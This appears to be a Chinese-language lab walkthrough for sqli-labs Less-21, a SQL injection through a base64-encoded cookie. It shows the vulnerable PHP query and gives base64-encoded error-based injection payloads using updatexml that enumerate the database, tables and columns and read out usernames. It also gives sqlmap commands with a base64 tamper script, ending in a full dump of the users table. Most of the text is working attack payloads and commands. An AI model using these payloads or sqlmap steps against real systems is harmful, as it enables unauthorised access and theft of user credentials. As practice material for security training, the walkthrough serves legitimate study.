---
title: less21
url: https://www.yuque.com/u29002979/ep2zrx/gpk8saglgv3g7wdc
---

```bash
$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";

$sql="SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1";

echo " Your Cookie is deleted";
				setcookie('uname', base64_encode($row1['username']), time()-3600);
				header ('Location: index.php');
```

闭合方式')

成功登录后发现在Cookie处登录的信息被进行了加密，

> YOUR USER AGENT IS : Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36
> YOUR IP ADDRESS IS : 192.168.31.119
> DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE
> YOUR COOKIE : **uname = YWRtaW4=** and expires: Wed 16 Nov 2022 - 20:04:08
> Your Login name:admin
> Your Password:admin
> Your ID:8

说明在客户端登录的信息被进行了加密 &#x20;
** base64解码**YWRtaW4=为admin
可以尝试在每次注入前对payload进行加密再注入

<a name="DsPkr"></a>

# 判断字段数

`uname=admin' order by 4 -- +`
先将语句进行base64加密，再进行注入，
`uname=YWRtaW4nIG9yZGVyIGJ5IDQgLS0gKw==`

> Issue with your mysql: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'order by 4 -- +') LIMIT 0,1' at line 1

通过回显找到闭合方式为')\ <a name="mqKGp"></a>

# 报错注入

```bash
爆破数据库名
uname=admin') union select 1,2,updatexml(1,concat(0x7e,database(),0x7e),1)-- +
uname=YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwyLHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLGRhdGFiYXNlKCksMHg3ZSksMSktLSAr
爆破数据表名
uname=admin') union select 1,2,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1)-- +
uname=YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwyLHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWEgPSBkYXRhYmFzZSgpKSwweDdlKSwxKS0tICs=
爆破字段名
uname=admin') union select 1,2,updatexml(1,concat(0x7e,(select (column_name) from information_schema.columns where table_name='users' limit 8,1),0x7e),1)-- +
uname=YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwyLHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgKGNvbHVtbl9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIHdoZXJlIHRhYmxlX25hbWU9J3VzZXJzJyBsaW1pdCA4LDEpLDB4N2UpLDEpLS0gKw==
爆破字段
uname=admin') union select 1,2,updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)-- +
uname=YWRtaW4nKSB1bmlvbiBzZWxlY3QgMSwyLHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgdXNlcm5hbWUgZnJvbSB1c2VycyBsaW1pdCAwLDEpLDB4N2UpLDEpLS0gKw==
```

<a name="ImHDK"></a>

# sqlmap加密注入运用

将数据包头的内容重新粘贴到新的文档中，
在Cookie处标上*&#x20;
启动sqlmap,对进行加密注入的数据需要用到tamper模块

> **--tamper="base64encode.py"**

```bash
GET /less-21/index.php HTTP/1.1
Host: 192.168.31.193
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: uname=YWRtaW4%3D*
Connection: close
```

```bash
扫描
sqlmap -r 3.txt --batch --level 3 --tamper="base64encode.py"
爆破数据库
sqlmap -r 3.txt --batch --level 3 --tamper="base64encode.py" --current-db
爆破表单
sqlmap -r 3.txt --batch --level 3 --tamper="base64encode.py" -D security --tables
脱库
sqlmap -r 3.txt --batch --level 3 --tamper="base64encode.py" -D security -T users --dump
```
